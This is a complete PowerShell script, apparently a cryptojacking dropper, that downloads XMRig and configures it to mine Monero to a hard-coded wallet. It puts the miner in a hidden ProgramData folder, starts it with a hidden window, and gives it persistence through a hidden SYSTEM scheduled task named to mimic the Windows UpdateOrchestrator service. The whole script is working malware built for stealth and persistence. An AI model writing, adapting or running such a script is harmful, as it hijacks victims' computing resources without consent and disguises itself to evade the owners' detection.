# ================================================
# XMRig DEBUG DEPLOYMENT v2 - FIXED VERSION
# Full logging, works on Windows 10/11
# ================================================

$LogFile = "C:\Windows\Temp\xmr_deploy_debug_v2.log"

function Log {
    param([string]$Message)
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$Timestamp | $Message" | Out-File -FilePath $LogFile -Append -Encoding UTF8
    Write-Host "$Timestamp | $Message" -ForegroundColor Cyan
}

Log "=== XMRig DEBUG v2 DEPLOYMENT STARTED ==="

# 1. Hidden install directory
$InstallDir = "C:\ProgramData\XMRUpdate"
if (-not (Test-Path $InstallDir)) {
    New-Item -Path $InstallDir -ItemType Directory -Force | Out-Null
    (Get-Item $InstallDir).Attributes += "Hidden"
}
Log "Install directory: $InstallDir"

# 2. Download XMRig 6.25.0
$ZipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
$ZipPath = "$env:TEMP\xmrig-v2.zip"

try {
    Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath -UseBasicParsing -TimeoutSec 60
    Log "Download completed"
} catch {
    Log "ERROR download: $($_.Exception.Message)"
    throw
}

# 3. Extract
try {
    Expand-Archive -Path $ZipPath -DestinationPath $InstallDir -Force
    Log "Extraction completed"
} catch {
    Log "ERROR extract: $($_.Exception.Message)"
    throw
}

Remove-Item $ZipPath -Force -ErrorAction SilentlyContinue

# Move files if inside subfolder
$SubFolder = Get-ChildItem $InstallDir -Directory | Where-Object { $_.Name -like "*xmrig*" } | Select-Object -First 1
if ($SubFolder) {
    Move-Item "$($SubFolder.FullName)\*" $InstallDir -Force
    Remove-Item $SubFolder.FullName -Recurse -Force
    Log "Files moved from subfolder"
}

# 4. Find xmrig.exe
$ExePath = (Get-ChildItem -Path $InstallDir -Recurse -Filter "xmrig.exe" -File | Select-Object -First 1).FullName
if (-not $ExePath) {
    Log "ERROR: xmrig.exe not found!"
    throw "xmrig.exe missing"
}
Log "XMRig found: $ExePath"

# 5. Config.json (60% threads, your wallet, TLS pool)
$Config = @{
    autosave       = $false
    background     = $false
    colors         = $false
    cpu            = @{ enabled = $true; "max-threads-hint" = 60 }
    "donate-level" = 0
    "log-file"     = $null
    pools          = @(
        @{
            algo      = "rx/0"
            url       = "pool.supportxmr.com:443"
            user      = "86ai84R8527XLKGjipKuW6YSjpwnevaGESZWnW1kEnpJVnmLLVUTd2PC2hDu8e9oDLYtWK9xGhysd89Mxq1rNZkoQR5DnNd"
            pass      = "x"
            keepalive = $true
            tls       = $true
            "rig-id"  = $env:COMPUTERNAME
        }
    )
    "print-time"   = 60
    retries        = 5
    "retry-pause"  = 5
} | ConvertTo-Json -Depth 10

$ConfigPath = "$InstallDir\config.json"
$Config | Out-File -FilePath $ConfigPath -Encoding UTF8 -Force
Log "config.json created (60% threads)"

# 6. Start miner hidden (fixed)
try {
    Start-Process -FilePath $ExePath -ArgumentList "-c `"$ConfigPath`" -B --no-color" -WindowStyle Hidden
    Log "Miner started in background (WindowStyle Hidden)"
} catch {
    Log "ERROR starting miner: $($_.Exception.Message)"
}

# 7. Persistence - Fixed Scheduled Task
$TaskName = "Microsoft\Windows\UpdateOrchestrator\USOWorker"

try {
    $Action    = New-ScheduledTaskAction -Execute $ExePath -Argument "-c `"$ConfigPath`" -B --no-color"
    $Trigger   = New-ScheduledTaskTrigger -AtStartup
    $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    
    $Settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries $true -DontStopIfGoingOnBatteries $true -ExecutionTimeLimit ([TimeSpan]::Zero) -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
    $Settings.Hidden = $true   # <-- Fixed way to set hidden

    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force | Out-Null
    Log "SUCCESS: SYSTEM task created with persistence at startup"
} catch {
    Log "SYSTEM task failed: $($_.Exception.Message)"
    Log "Trying fallback (current user)..."

    # Fallback
    $Action    = New-ScheduledTaskAction -Execute $ExePath -Argument "-c `"$ConfigPath`" -B --no-color"
    $Trigger   = New-ScheduledTaskTrigger -AtLogOn
    $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive
    
    $Settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries $true -DontStopIfGoingOnBatteries $true -ExecutionTimeLimit ([TimeSpan]::Zero)
    $Settings.Hidden = $true

    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force | Out-Null
    Log "Fallback task created (AtLogOn)"
}

Log "=== XMRig DEBUG v2 DEPLOYMENT FINISHED ==="
Log "Log file: $LogFile"
Log "Check miner:   tasklist | findstr xmrig"
Log "Check task:    schtasks /query /tn `"$TaskName`" /fo LIST /v"
Log "Check config:  type `"$ConfigPath`""
